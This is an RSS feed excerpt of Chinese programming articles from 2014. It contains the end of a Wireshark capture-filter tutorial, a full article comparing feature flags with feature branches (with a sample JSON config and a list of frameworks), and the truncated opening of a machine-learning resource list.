&lt;li&gt;icmp[icmptype]==&amp;lt;identifier&amp;gt;: 抓取 ICMP代码等于identifier的ICMP报文, 如icmp-echo 以及 icmp-request。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;方括号中第一个数字表示从协议头开始的偏移量，第二个数字表示需要观察多少位。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/6e18d07030a1bb14e1c6e6ff26fb78de.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;抓取发到广播或多播地址的数据流&lt;/strong&gt;&lt;strong&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;只需侦听广播或多播数据流，就可以掌握网络上主机的许多信息。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ip broadcast：抓取广播报文&lt;/li&gt;
&lt;li&gt;ip multicast：抓取多播报文&lt;/li&gt;
&lt;li&gt;dst host ff02::1：抓取到IPv6多播地址所有主机的数据流&lt;/li&gt;
&lt;li&gt;dst host ff02::2：抓取到IPv6多播地址所有路由器的数据流&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;小贴士：&lt;/p&gt;
&lt;p&gt;Wireshark包含了一些默认的抓包过滤条件。点击主工具栏的&lt;strong&gt;Edit Capture Filters&lt;/strong&gt;，跳转到已保存抓包过滤列表。你会发现一些常见抓包过滤的示例。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;抓取基于&lt;/strong&gt;&lt;strong&gt;MAC地址的数据流:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当你需要抓取发到/来自某一主机的IPv4或IPv6数据流，可创建基于主机MAC地址的抓包过滤条件。&lt;/p&gt;
&lt;p&gt;应用MAC地址时，需确保与目标主机处于同一网段。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ether host 00:08:15:00:08:15：抓取发到/来自00:08:15:00:08:15的数据流&lt;/li&gt;
&lt;li&gt;ether src 02:0A:42:23:41:AC：抓取来自02:0A:42:23:41:AC的数据流&lt;/li&gt;
&lt;li&gt;ether dst 02:0A:42:23:41:AC：抓取发到02:0A:42:23:41:AC的数据流&lt;/li&gt;
&lt;li&gt;not ether host 00:08:15:00:08:15：抓取除了发到/来自00:08:15:00:08:15以外的所有数据流&lt;/li&gt;
&lt;li&gt;ether broadcast或ether dst ff:ff:ff:ff:ff:ff：抓取广播报文&lt;/li&gt;
&lt;li&gt;ether multicast：多播报文&lt;/li&gt;
&lt;li&gt;抓取指定以太网类型的报文：ether proto 0800&lt;/li&gt;
&lt;li&gt;抓取指定VLAN：vlan &amp;lt;vlan number&amp;gt;&lt;/li&gt;
&lt;li&gt;抓取指定几个VLAN：vlan &amp;lt;vlan number&amp;gt; and vlan &amp;lt;vlan number&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;抓取基于指定应用的数据流&lt;/strong&gt;&lt;strong&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;你可能需要查看基于一个或几个应用的数据流。抓包过滤器语法无法识别应用名，因此需要根据端口号来定义应用。通过目标应用的TCP或UDP端口号，将不相关的报文过滤掉。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port 53：抓取发到/来自端口53的UDP/TCP数据流（典型是DNS数据流）&lt;/li&gt;
&lt;li&gt;not port 53：抓取除了发到/来自端口53以外的UDP/TCP数据流&lt;/li&gt;
&lt;li&gt;port 80：抓取发到/来自端口80的UDP/TCP数据流（典型是HTTP数据流）&lt;/li&gt;
&lt;li&gt;udp port 67：抓取发到/来自端口67的UDP数据流（典型是DHCP据流）&lt;/li&gt;
&lt;li&gt;tcp port 21：抓取发到/来自端口21的TCP数据流（典型是FTP命令通道）&lt;/li&gt;
&lt;li&gt;portrange 1-80：抓取发到/来自端口1-80的所有UDP/TCP数据流&lt;/li&gt;
&lt;li&gt;tcp portrange 1-80：抓取发到/来自端口1-80的所有TCP数据流&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;抓取结合端口的数据流&lt;/strong&gt;&lt;strong&gt;:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当你需要抓取多个不连续端口号的数据流，将它们通过逻辑符号连接起来，如下图所示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;port 20 or port 21：抓取发到/来自端口20或21的UDP/TCP数据流（典型是FTP数据和命令端口）&lt;/li&gt;
&lt;li&gt;host 10.3.1.1 and port 80：抓取发到/来自10.3.1.1端口80的数据流&lt;/li&gt;
&lt;li&gt;host 10.3.1.1 and not port 80：抓取发到/来自10.3.1.1除了端口80以外的数据流&lt;/li&gt;
&lt;li&gt;udp src port 68 and udp dst port 67：抓取从端口68到端口67的所有UDP数据流（典型是从DHCP客户端到DHCP服务器）&lt;/li&gt;
&lt;li&gt;udp src port 67 and udp dst port 68：抓取从端口67到端口68的所有UDP数据流（典型是从DHCP服务器到DHCP客户端）&lt;/li&gt;
&lt;li&gt;抓取TCP连接的开始（SYN）和结束（FIN）报文，配置tcp[tcpflags] &amp;amp; (tcp-syn|tcp-fin)!=0&lt;/li&gt;
&lt;li&gt;抓取所有RST(Reset)标志位为1的TCP报文，配置tcp[tcpflags] &amp;amp; (tcp-rst)!=0&lt;/li&gt;
&lt;li&gt;less &amp;lt;length&amp;gt;：抓取小于等于某一长度的报文，等同于len &amp;lt;=&amp;lt;length&amp;gt;&lt;/li&gt;
&lt;li&gt;greater &amp;lt;length&amp;gt;：抓取大于等于某一长度的报文，等同于len &amp;gt;=&amp;lt;length&amp;gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SYN: 简历连接的信号&lt;/p&gt;
&lt;p&gt;FIN: 关闭连接的信号&lt;/p&gt;
&lt;p&gt;ACK: 确认接收数据的信号&lt;/p&gt;
&lt;p&gt;RST: 立即关闭连接的信号&lt;/p&gt;
&lt;p&gt;PSH: 推信号，尽快将数据转由应用处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×00 = 0: No flags set (null scan)&lt;/li&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×01 = 1: FIN set and ACK not set&lt;/li&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×03 = 3: SYN set and FIN set&lt;/li&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×05 = 5: RST set and FIN set&lt;/li&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×06 = 6: SYN set and RST set&lt;/li&gt;
&lt;li&gt;tcp[13] &amp;amp; 0×08 = 8: PSH set and ACK not set&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;tcp[13]是从协议头开始的偏移量，0,1,3,5,6,8是标识位&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/589b72d6f6daa6d9de863f779bac8c7c.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;尽量避免使用抓包过滤。即便多看几个报文，也比漏看一个报文要好。&lt;/strong&gt;当你抓取了大量报文的时候，用显示过滤（过滤选项也更多）来重点查看某一数据流。&lt;/p&gt;
&lt;p&gt;小贴士：&lt;/p&gt;
&lt;p&gt;如果你需要查看TCP帧中的某一ASCII字符串，用Wireshark String-Matching Capture Filter Generator(&lt;a href=&quot;http://www.wireshark.org/tools/string-cf.html&quot; target=&quot;_blank&quot;&gt;http://www.wireshark.org/tools/string-cf.html&lt;/a&gt;)。例如，想要抓取HTTP GET报文，输入GET并将TCP偏移量设置为0。&lt;/p&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Tue, 22 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-22-74018-e2c2860b8.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-22-74018-e2c2860b8.html</guid>
        
        
      </item>
    
      <item>
        <title>Feature Flag 功能发布控制</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;h2&gt;背景&lt;/h2&gt;
&lt;p&gt;产品在新功能发布前，可能会采取小流量测试的方式，或者在确定方案前使用A/B测试来衡量。一般开发人员会跟运维同学合作，通过一些现有平台切换机器或者流量来实现。本文介绍了另外一种简便的方式，并解释了其在持续集成上的应用，同时提供了现有的开发框架供快速使用。&lt;/p&gt;
&lt;h2&gt;Feature Flag VS Feature Branches&lt;/h2&gt;
&lt;p&gt;Feature Flag(又名 Feature Toggle、Flip等)是一种允许控制线上功能开启或者关闭的方式，通常会采取配置文件的方式来控制。提到Feature Flag一般都会跟Feature Branches进行比较。这两个有什么关联与差别呢？可以通过一个简单的示例来比较：&lt;/p&gt;
&lt;p&gt;假设产品需要添加一个功能，如果你在主干上进行开发，那么通常的做法是在前端开发人员在界面上添加功能，然后可能会有其他同学来完成后端服务、安全保障，最后测试及Bug修复并发布上线。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/3f023edafa76373e737f3cda38decf85.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73931&quot; alt=&quot;new-feature&quot; src=&quot;/images/jobbole.com/0ceec95bf020414d8fd832e7b7e08a76.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;上图中有个明显的问题是&lt;strong&gt;主干分支上在功能测试完毕之前是不能进行发布&lt;/strong&gt;的，因为功能已经在提供在界面中，必须完备之后才能发布给用户使用。&lt;/p&gt;
&lt;p&gt;当然解决方法也很简单，例如我们常见的是会使用功能分支(Feature Branches)来解决。在主干上拉取一个分支，然后在分支上开完测试完之后在合并到主干上，这样就不会影响主干的持续发布了。如果有另外的新的功能那么同样拉取新的分支来解决。如下图：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/b139771f4bd796365f7d28ed3593d19c.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73933&quot; alt=&quot;new-feature2&quot; src=&quot;/images/jobbole.com/b4e810b6466d9ac806b26bbd5a79ad40.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;但这样同样存在问题，如果一个功能比较复杂，开发的周期较长，而在此期间主干上已经多次修改代码，那么等分支上开发完之后合并到主干将是一个比较麻烦的工作。你必须去处理各种冲突，与其他开发人员沟通修改点。这是很多人不愿意做的。&lt;/p&gt;
&lt;p&gt;于是有人提供了新的方案来解决这个问题。例如将开发工作拆分成多个小块，在各个分支上开发测试完成后及时合并到主干中，并且可以先隐藏界面功能，直到所有的功能开发完成之后才展现。这样每次合并的难度就小多了；或者每次将主干上的修改都及时同步到分支上，这样分支上开发完成之后合并到主干上就简单多了。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/5876f970ca04ac464c0e4664f69a9a51.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73934&quot; alt=&quot;new-feature3&quot; src=&quot;/images/jobbole.com/cd969a53adefb39cbb953d2828ec2028.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;但如果&lt;strong&gt;发布时出现bug&lt;/strong&gt;怎么办？可能常见的是进行回滚重新上线。有什么方式既能避免分支合并的麻烦、保持主干快速迭代随时发布，又能更好的控制新功能的发布、方便的进行小流量或快速回滚操作呢？答案就是Feature Flag。&lt;/p&gt;
&lt;p&gt;Feature Flag允许关闭未完成的功能，你可以在主干上进行迭代开发，新功能即便未开发完成也不会影响发布，因为它对用户是&lt;code&gt;关闭&lt;/code&gt;的。当功能开发完成之后，修改配置便可以让功能发布。这种操作甚至可以在线上进行，例如代码已经发布但功能不可见，你可以修改配置让功能对&lt;strong&gt;特定的用户&lt;/strong&gt;(线上测试、小流量或者全量发布等)可见。如果发现新功能存在问题，那么可以通过配置文件来迅速回滚，而必须重新分支上线。Feature Flag原理示意图如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/990e4ee6ca912e39bafcd11f05375d5f.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73936&quot; alt=&quot;featureToggle&quot; src=&quot;/images/jobbole.com/6312cf3bb128a0d3eb8de77d6c9798fe.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;各自的优缺点&lt;/h2&gt;
&lt;blockquote&gt;&lt;p&gt;选择合适的方案，而不拘泥于方式本身&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;并没有万能的方案，两种方式都有各自的优缺点。&lt;/p&gt;
&lt;h3&gt;Feature Branches&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;优点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同时开发多个功能分支不会影响主干和线上代码&lt;/li&gt;
&lt;li&gt;在分支上开发新功能时不用担心对其他在开发的功能的影响&lt;/li&gt;
&lt;li&gt;现有很多持续集成系统支持分支的构建、测试、部署等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;缺点&lt;/strong&gt;也很明显，&lt;a href=&quot;http://martinfowler.com/bliki/FeatureBranch.html&quot; target=&quot;_blank&quot;&gt;Martin Fowler&lt;/a&gt;的文章中已经做了全面的阐述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分支分出去时间越长往往代码合并难度越大&lt;/li&gt;
&lt;li&gt;在一个分支中修改了函数名字可能会引入大量编译错误。这点被称为语义冲突（semantic conflict）&lt;/li&gt;
&lt;li&gt;为了减少语义冲突，会尽量少做重构。而重构是持续改进代码质量的手段。如果在开发的过程中持续不断的存在功能分支，就会阻碍代码质量的改进。&lt;/li&gt;
&lt;li&gt;一旦代码库中存在了分支，也就不再是真正的持续集成了。当然你可以给每个分支建立一个对应的CI，但它只能测试当前分支的正确性。如果在一个分支中修改了函数功能，但是在另一个分支还是按照原来的假设在使用，在合并的时候会引入bug，需要大量的时间来修复这些bug。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Feature Toggle&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;优点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;避免了分支合并代码冲突的问题，因为是基于主干的开发&lt;/li&gt;
&lt;li&gt;每次提交都在主干，迭代速度明显有优势&lt;/li&gt;
&lt;li&gt;新功能的整个过程都持续集成&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;缺点&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;未完成的功能可能会部署到线上，如果配置有误可能将未完成的功能开启。当然可以将界面层最后开发避免过早暴露。&lt;/li&gt;
&lt;li&gt;主干上担心提交代码影响其他功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们可以根据需要选择合适的方案。Feature Flag在避免分支合并加快迭代上有优势，另外Feature Flag除了主干开发上的支持，还有什么实用功能呢？下面来介绍。&lt;/p&gt;
&lt;h2&gt;Feature Flag种类与应用&lt;/h2&gt;
&lt;p&gt;一般Feature Flag可以分为两类，见下所示：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;发布开关&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在发布代码时关掉未完成的功能&lt;/li&gt;
&lt;li&gt;生存期短&lt;/li&gt;
&lt;li&gt;功能稳定就马上删除&lt;/li&gt;
&lt;li&gt;在整个开发过程中有预定义的值&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;业务开关&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实现A/B测试&lt;/li&gt;
&lt;li&gt;针对特定人群发布功能尽早获得反馈&lt;/li&gt;
&lt;li&gt;针对特定条件开启或者关闭功能。例如可以设置在指定时间点开启，这样新功能将按照设定自动上线下线，无需手动上线，适合专题等情况&lt;/li&gt;
&lt;li&gt;能线上开启或者关闭,实现快速回滚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;发布开关主要是为了隐藏未开发完成的功能，而业务开关则可以帮助我们快速满足某些需求。例如A/B测试，Feature Flag可以轻松控制展现哪个功能，提升A/B测试的可维护性。我们也可以通过配置里面的逻辑让新功能针对小部分人群甚至是特定地域的人群发布，尽早获取功能的反馈。甚至是可以在线上开启调试，只让新功能对调试人员可见。而这些都只需要配置文件和简单的标记来实现。&lt;/p&gt;
&lt;h2&gt;谁在用Feature Flag&lt;/h2&gt;
&lt;blockquote&gt;&lt;p&gt;功能看起来很酷，但是不是新东西？有谁在用呢，我可不不愿意承担风险&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;事实上Feature Flag已经在国外互联网公司中获得广泛的使用。例如FaceBook、Google等公司使用基于主干的开发模式来持续集成开发，Feature Flag是其中一个基础技术。下面这幅图展现了FaceBook开发模式转变历程,可以看到几年前facebook就开始使用Feature Toggle，使用了Feature Flag关闭主干上未开发完成的功能来保证快速迭代和高频率的发布。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/546b1655ef24c07a846869272a16ae15.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73938&quot; alt=&quot;facebook&quot; src=&quot;/images/jobbole.com/90222994abf75057531d3a23ffcb6e14.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;国外主干开发中推荐这样一种方式：trunk作为开发主线，所有开发人员完成开发后向及时向主干提交代码，开发人员不允许在主干上拉取分支。在发布的时候由系统拉取分支发布，主干上的bug修复及时同步到发布分支。开发人员可以本地使用git等工具进行版本管理。如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/d2c55b38c1f915bba4d4b1af268aa552.jpg&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73939&quot; alt=&quot;tbd&quot; src=&quot;/images/jobbole.com/595bdd6f052b91c2161119c4bff5c5f4.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;虽然基于主干的开发模式已经成为国外的主流，但分支开发并不是不该使用。使用分支不推荐的是让新功能代码在分支上长时间堆积，分支应当是生存周期短的。&lt;/p&gt;
&lt;p&gt;实际应用中我们可以根据业务场景来选择是否用功能分支还是Feature Flag，并且这两者可以相互结合。例如在文章前面提到的示例中，可以使用分支来开发细分的子功能保持分支及时合并，同时使用Feature Flag来控制功能的发布，提升工作效率。&lt;/p&gt;
&lt;h2&gt;最佳实践&lt;/h2&gt;
&lt;p&gt;除了主干开发，什么情况下选择使用Feature Flag呢？下面是使用Feature Flag的一些典型场景：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 UI 中隐藏或禁用新功能&lt;/li&gt;
&lt;li&gt;在应用程序中隐藏或禁用新组件&lt;/li&gt;
&lt;li&gt;对接口进行版本控制&lt;/li&gt;
&lt;li&gt;扩展接口&lt;/li&gt;
&lt;li&gt;支持组件的多个版本&lt;/li&gt;
&lt;li&gt;将新功能添加到现有应用程序&lt;/li&gt;
&lt;li&gt;增强现有应用程序中的现有功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以看到，由于Feature Flag本身是对业务功能的控制，所以不适于功能大范围的改动等情况。另外使用过程中需要注意一些问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;只在需要的地方创建开关。美酒虽豪，不可贪杯。滥用任何技术都会出现问题。&lt;/li&gt;
&lt;li&gt;控制开关的数量。同上，开关应按需使用并及时清除。&lt;/li&gt;
&lt;li&gt;开关之间代码保持独立。如果代码存在依赖就没法删除，最终维护性反而变差&lt;/li&gt;
&lt;li&gt;清除发布开关和废弃代码。发布开关应当在功能稳定后删除，旧代码也是。&lt;/li&gt;
&lt;li&gt;界面层最后暴露。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;如何实现&lt;/h2&gt;
&lt;p&gt;实现这套东西复杂吗？下面以php和smarty模板为例来介绍。&lt;/p&gt;
&lt;p&gt;首先需要一套控制代码逻辑的工具，虽然开源的框架有在后端代码层的支持，但推荐在模板层使用Feature Flag，因为模板直接跟功能挂钩，维护起来更加直观方便。&lt;/p&gt;
&lt;p&gt;例如我们会提供一个smarty插件，让你控制相应的展现:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/4f8e3c1849fd0fcf7be5f15a50f4deba.png&quot; rel=&quot;lightbox[73930]&quot; title=&quot;Feature Flag 功能发布控制&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73940&quot; alt=&quot;feature-smarty&quot; src=&quot;/images/jobbole.com/9fb17b4ac0813c18537c4c413574ebbc.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;这个代码的意思是如果common模块的featureA命中，则展现下面代码，否则展现另外一套代码，展现代码由于与功能相关，所以就相当于控制了展现哪个功能。当然你也可以不用&lt;code&gt;featureelse&lt;/code&gt;只控制功能的开启或者关闭。&lt;/p&gt;
&lt;p&gt;另外我们需要一个配置文件，对应featureA的配置，如下所示：&lt;/p&gt;
&lt;pre class=&quot;brush: javascript; gutter: false&quot;&gt;{
      &quot;features&quot; : {
          &quot;featureA&quot; : {
              &quot;type&quot; : &quot;switch&quot;,
              &quot;value&quot; : &quot;on&quot;,
              &quot;desc&quot; : &quot;test switch feature work or not&quot;
          }
      }
 }&lt;/pre&gt;
&lt;p&gt;featureA配置的value是&lt;code&gt;on&lt;/code&gt;，开关类型是&lt;code&gt;switch&lt;/code&gt;。也就是说这个功能是开启的。与switch类似的可以实现多个feature类型，例如抽样控制、日期控制、地域控制等，代码逻辑只需要根据value的设定判断是true还是false。例如抽样类型，value设置0.5，那么对应的类型逻辑只需要判断随机数是否在0-0.5范围内而已。&lt;/p&gt;
&lt;p&gt;部署中我们只需要修改featureA的配置就可以控制功能的发布，是不是so easy!&lt;/p&gt;
&lt;h2&gt;开发框架&lt;/h2&gt;
&lt;p&gt;有哪些相应的开源框架呢？几乎各种语言都有相应的实现。例如FEX &lt;a href=&quot;http://fis.baidu.com/&quot; target=&quot;_blank&quot;&gt;FIS&lt;/a&gt;小组提供了基于php和node.js的框架。此外还有多种语言的开源实现：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;语言&lt;/th&gt;
&lt;th&gt;Feature Flag框架&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;php&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;基于smarty的&lt;a href=&quot;https://github.com/wangcheng714/feature-flag&quot; target=&quot;_blank&quot;&gt;Feature Flag框架&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;NodeJs&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;基于Node前后端解决方案Yogurt的&lt;a href=&quot;https://github.com/fex-team/yog-feature&quot; target=&quot;_blank&quot;&gt;Feature Flag框架&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;java&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;http://www.togglz.org/&quot; target=&quot;_blank&quot;&gt;Togglz&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;.NET&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://github.com/jason-roberts/FeatureToggle&quot; target=&quot;_blank&quot;&gt;FeatureToggle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ruby&lt;/td&gt;
&lt;td&gt;
&lt;a href=&quot;https://github.com/FetLife/rollout&quot; target=&quot;_blank&quot;&gt;Rollout&lt;/a&gt;、&lt;a href=&quot;https://github.com/jamesgolick/degrade&quot; target=&quot;_blank&quot;&gt;Degrade&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Python&lt;/td&gt;
&lt;td&gt;
&lt;a href=&quot;https://github.com/disqus/gargoyle&quot; target=&quot;_blank&quot;&gt;Gargoyle&lt;/a&gt;、&lt;a href=&quot;https://github.com/disqus/nexus&quot; target=&quot;_blank&quot;&gt;Nexus admin&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Groovy&lt;/td&gt;
&lt;td&gt;&lt;a href=&quot;https://github.com/ryannorris/grails-feature-toggle&quot; target=&quot;_blank&quot;&gt;GrailsFeatureToggle&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Feature Flag与Feature Branches各有优势，结合使用能发挥更大作用&lt;/li&gt;
&lt;li&gt;结合业务场景选择合适方案&lt;/li&gt;
&lt;li&gt;Feature Flag能支持主干开发，并在控制功能发布上有独特优势&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;参考资料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://msdn.microsoft.com/zh-cn/magazine/dn683796.aspx&quot; target=&quot;_blank&quot;&gt;采用功能切换进行软件开发&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.infoq.com/cn/articles/function-switch-realize-better-continuous-implementations&quot; target=&quot;_blank&quot;&gt;使用功能开关更好地实现持续部署&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://martinfowler.com/bliki/FeatureToggle.html&quot; target=&quot;_blank&quot;&gt;FeatureToggle&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.slideshare.net/HendrikEbbers/feature-driven-development-35863636?qid=2a29fcc2-9c8c-404f-ae41-d4dc7494d278&amp;amp;v=qf1&amp;amp;b=&amp;amp;from_search=5&quot; target=&quot;_blank&quot;&gt;Feature driven development&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://blog.pluralsight.com/favor-feature-toggles-over-feature-branches&quot; target=&quot;_blank&quot;&gt;Favor Feature Toggles over Feature Branches&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://paulhammant.com/2013/04/05/what-is-trunk-based-development/&quot; target=&quot;_blank&quot;&gt;What is Trunk Based Development?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://abhishek-tiwari.com/post/decoupling-deployment-and-release-feature-toggles&quot; target=&quot;_blank&quot;&gt;Decoupling Deployment and Release- Feature Toggles&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 21 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-21-73930-06f292316.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-21-73930-06f292316.html</guid>
        
        
      </item>
    
      <item>
        <title>推荐！国外程序员整理的机器学习资源大全</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;本文汇编了一些机器学习领域的框架、库以及软件（按编程语言排序）。&lt;/p&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#c&quot; name=&quot;user-content-c&quot;&gt;&lt;/a&gt;C++&lt;/h2&gt;
&lt;h4&gt;
